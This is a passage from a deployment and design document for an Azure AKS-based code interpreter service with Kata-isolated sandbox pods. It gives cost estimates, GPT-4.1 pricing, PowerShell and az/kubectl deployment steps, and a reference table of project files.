|----------|-----|----------|------------|-------------|
| **AKS System Pool** | Standard_D2s_v3 (2 vCPU, 8 GB) | 1 node × 730 hrs | ~$0.096/hr | **~$70** |
| **AKS Sandbox Pool** | Standard_D4s_v3 (4 vCPU, 16 GB) | 0-3 nodes, scale to zero | ~$0.192/hr | **~$0-140** (usage-based) |
| **AKS Cluster Management** | Standard tier | 1 cluster | Free | **$0** |
| **Azure Container Registry** | Standard | 1 registry | $5/month | **$5** |
| **Azure Blob Storage** | Standard_LRS, Hot | ~1 GB estimated | ~$0.018/GB | **<$1** |
| **Blob Operations** | Read/Write | ~10K ops/month | $0.004/10K | **<$1** |
| **Log Analytics** | Per-GB | ~5 GB/month | $2.76/GB | **~$14** |
| **Azure OpenAI (GPT-4.1)** | Global Standard | Varies by usage | See below | **$5-50** |
| **Network Egress** | Standard | Minimal | ~$0.087/GB | **<$1** |

#### Azure OpenAI Token Pricing (GPT-4.1)

| Model | Input (per 1M tokens) | Output (per 1M tokens) |
|-------|----------------------|----------------------|
| gpt-4.1 | $2.00 | $8.00 |
| gpt-4.1-mini | $0.40 | $1.60 |
| gpt-4.1-nano | $0.10 | $0.40 |

**Per analysis request** (estimated):
- Code generation: ~800 input tokens + ~500 output tokens = ~$0.006
- Result explanation: ~1,500 input tokens + ~800 output tokens = ~$0.009
- **Total per request: ~$0.015** (~IDR 250)

### 9.2 Estimated Monthly Totals

| Scenario | System Pool | Sandbox Usage | OpenAI | Other | **Total** |
|----------|------------|---------------|--------|-------|-----------|
| **Dev/POC** (10 analyses/day) | $70 | ~$20 (2 hrs/day) | ~$5 | $20 | **~$115/mo** |
| **Light production** (50/day) | $70 | ~$60 (6 hrs/day) | ~$23 | $20 | **~$173/mo** |
| **Medium production** (200/day) | $70 | ~$140 (always 1 node) | ~$90 | $25 | **~$325/mo** |

### 9.3 Cost Optimization Options

| Optimization | Savings | Trade-off |
|-------------|---------|-----------|
| Switch system pool to **B2ms** (burstable) | ~$30/mo | 60% sustained CPU baseline |
| Use **gpt-4.1-mini** instead of gpt-4.1 | ~80% on LLM costs | Slightly less capable for complex analysis |
| **Azure Reservations** for system pool (1-year) | ~40% on compute | Commitment required |
| **Spot instances** for sandbox pool | ~70% on sandbox nodes | Preemption possible (acceptable for ephemeral workloads) |

---

## 10. Deployment Guide

### 10.1 Prerequisites

```powershell
# Required tools
az --version        # Azure CLI ≥ 2.60
kubectl version     # kubectl
docker --version    # Docker (for image builds)

# Required Azure access
az login
az account show     # Verify correct subscription
```

### 10.2 One-Command Deploy

```powershell
cd C:\labs\tech\codeintepreter

# Load your existing Azure OpenAI config
. .\openai-config.ps1

# Deploy everything
.\scripts\deploy-all.ps1
```

### 10.3 Step-by-Step Deploy

```powershell
# 1. Preflight check — validates tools, Azure login, providers, quotas
.\scripts\preflight-check.ps1

# 2. Deploy infrastructure — AKS, ACR, Storage, Monitoring (takes ~10 min)
. .\openai-config.ps1
.\scripts\deploy-infra.ps1

# 3. Deploy applications — build images, deploy to AKS (takes ~5 min)
.\scripts\deploy-apps.ps1

# 4. Post-deploy: Enable Workload Identity (if storage blocks key auth)
# (already automated in deploy-apps.ps1 for future runs)
```

### 10.4 Post-Deployment: Manual Steps for Enterprise Subscriptions

If your subscription has Azure Policy restrictions:

```powershell
# Enable Workload Identity on AKS (if not already done by Bicep)
az aks update --name <cluster> --resource-group <rg> --enable-oidc-issuer --enable-workload-identity

# Create Managed Identity for backend
az identity create --name ci-backend-identity --resource-group <rg>

# Assign Storage Blob Data Contributor
az role assignment create --assignee-object-id <MI-principal-id> --role "Storage Blob Data Contributor" --scope <storage-id>

# Federate K8s SA ↔ Azure MI
az identity federated-credential create --name ci-backend-fedcred --identity-name ci-backend-identity --issuer <OIDC-URL> --subject "system:serviceaccount:codeinterpreter:orchestrator-sa"

# Annotate K8s ServiceAccount
kubectl annotate sa orchestrator-sa -n codeinterpreter azure.workload.identity/client-id=<MI-client-id>
kubectl label sa orchestrator-sa -n codeinterpreter azure.workload.identity/use=true
```

### 10.5 Verification

```powershell
# Full automated verification (offline — no Azure calls)
.\verify-all.ps1

# Live E2E test (requires running deployment)
.\scripts\test-e2e-live.ps1 -BaseUrl "http://<ingress-ip>"
```

---

## File Reference

| File | Purpose |
|------|---------|
| `infra/main.bicep` | Infrastructure entry point (AKS, ACR, Storage, OpenAI, Monitoring) |
| `infra/modules/aks.bicep` | AKS with system + sandbox (Kata) node pools |
| `infra/modules/storage.bicep` | Blob Storage with datasets/outputs/audit-logs containers |
| `src/backend/app/main.py` | FastAPI application entry point |
| `src/backend/app/orchestrator.py` | Core pipeline: LLM → Sandbox → Explain → Audit |
| `src/backend/app/llm/provider.py` | Pluggable LLM adapter (Azure OpenAI) |
| `src/backend/app/sandbox.py` | K8s Job management for Kata sandbox pods |
| `src/backend/app/storage.py` | Blob Storage with Managed Identity + SAS tokens |
| `src/backend/app/routes/chat.py` | POST /api/chat endpoint |
| `src/backend/app/routes/upload.py` | POST /api/upload endpoint |
| `src/sandbox/executor.py` | Runs inside Kata VM: exec code, upload results |
| `src/frontend/src/app/page.tsx` | Chat UI with activity log |
| `src/frontend/src/lib/api.ts` | Frontend API client (relative URLs) |
| `k8s/app-deployment.yaml` | Backend + Frontend + Ingress K8s manifests |
| `k8s/sandbox-networkpolicy.yaml` | Network isolation for sandbox pods |
| `k8s/rbac.yaml` | RBAC: backend SA → sandbox Job permissions |
| `scripts/deploy-all.ps1` | One-command deployment (PS native) |
| `scripts/test-e2e-live.ps1` | Live E2E test with 5 banking scenarios |
| `verify-all.ps1` | Offline verification (72 wiring checks) |
